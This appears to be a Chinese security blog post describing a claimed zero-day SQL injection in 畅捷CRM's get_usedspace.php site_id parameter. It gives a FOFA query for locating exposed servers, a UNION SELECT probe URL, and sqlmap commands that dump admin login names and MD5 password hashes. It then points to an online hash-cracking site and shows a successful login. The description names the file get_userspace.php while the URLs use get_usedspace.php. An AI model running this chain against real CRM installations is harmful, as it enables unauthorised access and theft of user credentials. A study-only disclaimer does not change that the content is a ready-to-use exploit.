#  【0 day】畅捷CRM SQL注入漏洞获取管理员账号密码   
 迪哥讲事   2023-09-24 20:17  
  
#   
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5LNhD1ldtmHt07AlibFOqHmuT0fe8T3VUAIb6mUO338VyuMgvicLHgbTe4WKDknDRttO9vCocFWF0A/640?wx_fmt=png "")  
# 一、漏洞描述  
  
畅捷CRM g  
et_userspace.php文件中 site_id参数存在SQL注入漏洞  
# 二、影响范围  
  
  
畅捷CRM  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54M15LwYBZqgZclK0gN1fR8tG6LibdrLrU9GqlEDx6wDEH23BGlZm4GvQ/640?wx_fmt=png "")  
  
# 三、fofa查询  
  
```
title="畅捷CRM"
```  
  
# 四、漏洞检测  
  
****  
直接浏览器访问：  
```
http://ip:port/WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)--
```  
  
返回结果如下，则存在SQL注入漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54XohY7hzT97qA8Q79O6XUSiamqZfHQqTqSvpj8429ibTzWWRSAxr29glA/640?wx_fmt=png "")  
  
批量监测  
  
# 五、漏洞利用  
  
  
使用SQLmap进行漏洞利用  
  
获取当前数据库名称  
```
sqlmap -u http://ip:port/WebSer~1/get_usedspace.php?site_id=1 --batch  --current-db
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54SYYD7fc88VUrkeICFxoojskjLVXgOmh05Q1zfVSwppRNsIthic0IZ9Q/640?wx_fmt=png "")  
  
  
获取当前数据库表名  
```
sqlmap -u http://ip:port/WebSer~1/get_usedspace.php?site_id=1 --batch --dbms=mysql -D crmsaas_plus --tables
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54eDAeJLEnxeUM7gFibfT1bvDrWgicV8v03MRdzuOfic0JkTJNnDuNf7oibQ/640?wx_fmt=png "")  
  
  
获取系统当前用户名密码， 密码都是md5 加密的，简单的密码会自动爆破出来。  
  
```
sqlmap -u http://ip:port/WebSer~1/get_usedspace.php?site_id=1  --batch -D crmsaas_plus -T tc_user -C login_name,login_password -dump
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54VXcU0Libic9U2qbV9SonxZ4vzLkbbdmOxQ8Z3w7399fzvlyV9oBqyricA/640?wx_fmt=png "")  
  
  
可以使用https://cmd5.com/ 对加密的密码解密  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54WdEZGbT2oyMfYSxrRYP6wckaKDwU0m0FMHKrdzBIibq4otSN7oEwOwA/640?wx_fmt=png "")  
  
  
获取账号密码后成功登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54F6v6LycDUNiaIuHic7ZPvyFbGXKtBhPJwAicB6nz1rlj8QLSSSgibRCHtw/640?wx_fmt=png "")  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
如果你是一个长期主义者，欢迎加入我的知识星球([优先查看这个链接，里面可能还有优惠券](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247489122&idx=1&sn=a022eae85e06e46d769c60b2f608f2b8&chksm=e8a61c01dfd195170a090bce3e27dffdc123af1ca06d196aa1c7fe623a8957755f0cc67fe004&scene=21#wechat_redirect)  
)，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
[2022年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[SSRF研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
  
[xss研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487130&idx=1&sn=e20bb0ee083d058c74b5a806c8a581b3&chksm=e8a604f9dfd18defaeb9306b89226dd3a5b776ce4fc194a699a317b29a95efd2098f386d7adb&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
